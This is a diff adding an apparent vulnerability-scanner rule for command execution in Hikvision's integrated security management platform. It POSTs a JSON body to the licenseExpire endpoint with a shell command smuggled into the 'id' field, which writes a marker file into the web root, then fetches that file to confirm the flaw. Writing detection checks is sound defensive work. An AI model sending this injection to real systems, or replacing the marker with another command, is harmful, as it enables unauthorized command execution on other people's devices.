@@ -1,0 +1,19 @@
+name: HIKVISION-综合安防管理平台-licenseExpire命令执行
+description: >
+  成功上传文件
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /portal/cas/login/ajax/licenseExpire.do
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"      
+    body: >
+      {"type":"environment","operate":"","machines":{"id":"$(echo Rscan_test > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/360.txt)"}
+    expression:
+      status: 200
+  - method: GET
+    path: /vms/static/360.txt
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
